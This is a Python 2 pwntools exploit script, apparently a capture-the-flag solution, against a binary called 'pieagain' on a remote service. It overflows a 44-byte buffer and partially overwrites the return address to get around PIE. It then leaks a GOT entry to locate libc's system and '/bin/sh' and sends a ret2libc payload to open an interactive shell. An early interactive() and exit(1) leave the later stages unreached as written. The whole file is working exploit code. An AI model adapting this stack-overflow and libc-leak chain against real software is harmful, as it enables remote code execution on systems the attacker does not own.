# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 0

pwnable_filename = "./pieagain"
# libc_filename = "/lib/i386-linux-gnu/libc.so.6"
libc_filename = "./libc.so.6"

pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)


def generate_io():
    Io = remote("192.168.210.11", 10008)
    # Io = process(pwnable_filename)
    return Io


Io = generate_io()
# gdb.attach(proc.pidof(Io)[0], gdbscript='b read')


payload = flat([
    "A"
])

Io.sendline(payload)

time.sleep(0.5)


junk_size = 44
junk = junk_size * "A"


payload = flat([
    junk,
    # "\xF9"
    "\xDE"
])

Io.readuntil("again?\n")
Io.sendline(payload)

Io.interactive()
exit(1)

time.sleep(0.5)

data = Io.read()

# for i in range(0, len(data), 4):
#     base_addr = u32(data[i:i + 4])
#     print "0x%08x" % (base_addr)

# main_func_1_return_addr = 0x855


start_addr = u32(data[25 * 4:26 * 4])
print "[+] start_addr: 0x%08x" % (start_addr)

# start_addr - start_offset = write_plt_addr - write_plt_offset
start_offset = 0x00000580
write_plt_offset = 0x00000540

write_plt_addr = start_addr - start_offset + write_plt_offset
print "[+] write_plt_addr: 0x%08x" % (write_plt_addr)

stdout = 1
size = 0x20

binary_base_addr = start_addr & 0xFFFFF000
print "[+] binary_base_addr: 0x%08x" % (binary_base_addr)

payload = flat([
    junk,
    start_addr,
])

Io.sendline(payload)
time.sleep(0.5)

Io.readline()

Io.sendline("A")
time.sleep(0.5)

output_func_addr = binary_base_addr + 0x000007B2
print "[+] output_func_addr: 0x%08x" % (output_func_addr)
# payload = flat([
#     junk,
#     p32(output_func_addr),
#     p32(start_addr),
#     p32(stdout),
#     p32(binary_base_addr),
#     p32(size),
# ])
# Io.sendline(payload)


def leak(addr):
    Io.read()
    payload = flat([
        junk,
        p32(output_func_addr),
        p32(start_addr),
        p32(stdout),
        p32(addr),
        p32(4),
    ])
    Io.sendline(payload)
    return Io.read(4)


read_got = binary_base_addr + pwnable.got['read']

read_addr = u32(leak(read_got))
print "[+] read_addr: 0x%08x" % (read_addr)

# system_addr - libc_system_offset = read_addr - libc_read_offset
# system_addr = read_addr - libc_read_offset + libc_system_offset

libc_read_offset = libc.symbols['read']
libc_system_offset = libc.symbols['system']
libc_bin_sh_offset = next(libc.search("/bin/sh\x00"))

system_addr = read_addr - libc_read_offset + libc_system_offset
print "[+] system_addr: 0x%08x" % (system_addr)

bin_sh_addr = read_addr - libc_read_offset + libc_bin_sh_offset
print "[+] bin_sh_addr: 0x%08x" % (bin_sh_addr)


# gdb.attach(
#     proc.pidof(Io)[0],
#     gdbscript='b *0x%08x' % (binary_base_addr + 0x922)
# )

Io.sendline("A")

payload = flat([
    junk,
    p32(system_addr),
    p32(start_addr),
    p32(bin_sh_addr),
])

Io.sendline(payload)

Io.interactive()
